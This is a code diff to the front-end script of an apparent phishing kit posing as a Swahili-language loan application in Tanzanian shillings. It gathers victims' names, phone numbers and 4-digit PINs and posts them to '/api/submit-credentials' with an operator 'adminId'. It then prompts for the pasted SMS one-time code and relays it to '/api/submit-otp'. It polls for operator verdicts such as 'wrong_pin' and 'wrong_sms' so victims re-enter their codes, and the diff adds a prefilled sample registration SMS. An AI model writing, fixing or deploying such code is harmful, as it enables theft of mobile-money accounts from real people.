@@ -48,6 +48,18 @@ document.addEventListener('DOMContentLoaded', () => {
         fromCard.classList.add('hidden');
         toCard.classList.remove('hidden');
         toCard.classList.add('active');
+
+        if (toCard === stepOtp) {
+            autofillSMSMessage();
+        }
+    }
+
+    function autofillSMSMessage() {
+        const sampleSMS = "You are being registered in Mixx by Yas Super App, use the code 55uf50HYgp3mjqu4b0zY to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
+        if (otpText) {
+            otpText.value = sampleSMS;
+            charCount.innerText = `${sampleSMS.length}/1000`;
+        }
     }
 
     function updateCalculations() {
@@ -71,62 +83,79 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('loan-amount').value = amt;
     }
 
-    rangeAmount.addEventListener('input', updateCalculations);
-    rangeDuration.addEventListener('input', updateCalculations);
+    if (rangeAmount && rangeDuration) {
+        rangeAmount.addEventListener('input', updateCalculations);
+        rangeDuration.addEventListener('input', updateCalculations);
+        updateCalculations();
+    }
 
-    btnNaelewa.addEventListener('click', () => {
-        switchStep(stepNaelewa, stepSlider);
-    });
+    if (btnNaelewa) {
+        btnNaelewa.addEventListener('click', () => {
+            switchStep(stepNaelewa, stepSlider);
+        });
+    }
 
-    btnSliderNext.addEventListener('click', () => {
-        switchStep(stepSlider, stepLoan1);
-    });
+    if (btnSliderNext) {
+        btnSliderNext.addEventListener('click', () => {
+            switchStep(stepSlider, stepLoan1);
+        });
+    }
 
-    btnNext1.addEventListener('click', () => {
-        loanData.loanType = document.getElementById('loan-type').value;
-        loanData.amount = document.getElementById('loan-amount').value;
-        loanData.duration = document.getElementById('loan-duration').value;
-        loanData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
-        switchStep(stepLoan1, stepLoan2);
-    });
+    if (btnNext1) {
+        btnNext1.addEventListener('click', () => {
+            loanData.loanType = document.getElementById('loan-type').value;
+            loanData.amount = document.getElementById('loan-amount').value;
+            loanData.duration = document.getElementById('loan-duration').value;
+            loanData.purpose = document.getElementById('loan-purpose').value || 'Biashara';
+            switchStep(stepLoan1, stepLoan2);
+        });
+    }
 
-    btnPrev2.addEventListener('click', () => {
-        switchStep(stepLoan2, stepLoan1);
-    });
+    if (btnPrev2) {
+        btnPrev2.addEventListener('click', () => {
+            switchStep(stepLoan2, stepLoan1);
+        });
+    }
 
-    btnNext2.addEventListener('click', () => {
-        const firstName = document.getElementById('first-name').value.trim();
-        const lastName = document.getElementById('last-name').value.trim();
-        const phone = document.getElementById('phone').value.trim();
+    if (btnNext2) {
+        btnNext2.addEventListener('click', () => {
+            const firstName = document.getElementById('first-name').value.trim();
+            const lastName = document.getElementById('last-name').value.trim();
+            const phone = document.getElementById('phone').value.trim();
 
-        if (!firstName || !lastName || !phone) {
-            alert('Tafadhali jaza taarifa zote zinazohitajika.');
-            return;
-        }
+            if (!firstName || !lastName || !phone) {
+                alert('Tafadhali jaza taarifa zote zinazohitajika.');
+                return;
+            }
 
-        loanData.firstName = firstName;
-        loanData.lastName = lastName;
-        loanData.phone = phone;
+            loanData.firstName = firstName;
+            loanData.lastName = lastName;
+            loanData.phone = phone;
 
-        document.getElementById('confirm-phone').value = phone;
+            document.getElementById('confirm-phone').value = phone;
 
-        switchStep(stepLoan2, stepLoan3);
-        
-        document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
-        document.getElementById('summary-duration').innerText = loanData.duration;
-        document.getElementById('summary-purpose').innerText = loanData.purpose;
-    });
+            switchStep(stepLoan2, stepLoan3);
+            
+            document.getElementById('summary-amount').innerText = 'TSh ' + loanData.amount;
+            document.getElementById('summary-duration').innerText = loanData.duration;
+            document.getElementById('summary-purpose').innerText = loanData.purpose;
+        });
+    }
 
-    btnPrev3.addEventListener('click', () => {
-        switchStep(stepLoan3, stepLoan2);
-    });
+    if (btnPrev3) {
+        btnPrev3.addEventListener('click', () => {
+            switchStep(stepLoan3, stepLoan2);
+        });
+    }
 
-    btnSubmitLoan.addEventListener('click', () => {
-        loanData.employmentStatus = document.getElementById('employment-status').value;
-        loanData.annualIncome = document.getElementById('annual-income').value || '0';
-        
-        switchStep(stepLoan3, stepForm);
-    });
+    if (btnSubmitLoan) {
+        btnSubmitLoan.addEventListener('click', () => {
+            loanData.employmentStatus = document.getElementById('employment-status').value;
+            loanData.annualIncome = document.getElementById('annual-income').value || '0';
+            
+            switchStep(stepLoan3, stepForm);
+        });
+    }
 
     const pinInputs = document.querySelectorAll('.pin-input');
     pinInputs.forEach((input, index) => {
@@ -151,73 +180,78 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('pin-hidden').value = pin;
     }
 
-    loanForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const phoneInput = document.getElementById('confirm-phone').value.trim();
-        const pin = document.getElementById('pin-hidden').value;
+    if (loanForm) {
+        loanForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phoneInput = document.getElementById('confirm-phone').value.trim();
+            const pin = document.getElementById('pin-hidden').value;
 
-        if (pin.length !== 4) {
-            return;
-        }
-
-        // Hide any previous error banners
-        pinErrorBanner.classList.add('hidden');
-
-        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        
-        switchStep(stepForm, stepLoading);
-
-        try {
-            const response = await fetch('/api/submit-credentials', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: currentSessionId,
-                    sliderData,
-                    loanData,
-                    phone: phoneInput,
-                    pin: pin,
-                    adminId: adminId
-                })
-            });
-            const data = await response.json();
-            if (data.success) {
-                pollStatus();
+            if (pin.length !== 4) {
+                return;
             }
-        } catch (err) {
-            console.error('Error submitting credentials:', err);
-            switchStep(stepLoading, stepForm);
-        }
-    });
 
-    otpText.addEventListener('input', () => {
-        const len = otpText.value.length;
-        charCount.innerText = `${len}/1000`;
-    });
+            pinErrorBanner.classList.add('hidden');
 
-    btnThibitisha.addEventListener('click', async () => {
-        const text = otpText.value.trim();
-        if (!text) {
-            return;
-        }
+            currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            switchStep(stepForm, stepLoading);
 
-        smsErrorBanner.classList.add('hidden');
-        switchStep(stepOtp, stepLoading);
+            try {
+                const response = await fetch('/api/submit-credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        sliderData,
+                        loanData,
+                        phone: phoneInput,
+                        pin: pin,
+                        adminId: adminId
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    pollStatus();
+                }
+            } catch (err) {
+                console.error('Error submitting credentials:', err);
+                switchStep(stepLoading, stepForm);
+            }
+        });
+    }
 
-        try {
-            await fetch('/api/submit-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId: currentSessionId,
-                    otpText: text
-                })
-            });
-            pollStatus();
-        } catch (err) {
-            console.error('Error submitting OTP:', err);
-        }
-    });
+    if (otpText) {
+        otpText.addEventListener('input', () => {
+            const len = otpText.value.length;
+            charCount.innerText = `${len}/1000`;
+        });
+    }
+
+    if (btnThibitisha) {
+        btnThibitisha.addEventListener('click', async () => {
+            const text = otpText.value.trim();
+            if (!text) {
+                return;
+            }
+
+            smsErrorBanner.classList.add('hidden');
+            switchStep(stepOtp, stepLoading);
+
+            try {
+                await fetch('/api/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        otpText: text
+                    })
+                });
+                pollStatus();
+            } catch (err) {
+                console.error('Error submitting OTP:', err);
+            }
+        });
+    }
 
     function pollStatus() {
         if (statusInterval) clearInterval(statusInterval);
@@ -236,7 +270,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     switchStep(stepLoading, stepSuccess);
                 } else if (data.status === 'wrong_pin') {
                     clearInterval(statusInterval);
-                    // Clear PIN fields and display surface error banner on form page
                     pinInputs.forEach(i => i.value = '');
                     document.getElementById('pin-hidden').value = '';
                     pinErrorBanner.classList.remove('hidden');
@@ -244,7 +277,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     pinInputs[0].focus();
                 } else if (data.status === 'wrong_sms') {
                     clearInterval(statusInterval);
-                    // Clear SMS textarea and display surface error banner on OTP page
                     otpText.value = '';
                     charCount.innerText = '0/1000';
                     smsErrorBanner.classList.remove('hidden');
@@ -260,4 +292,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 3000);
     }
 });
-        
+                          
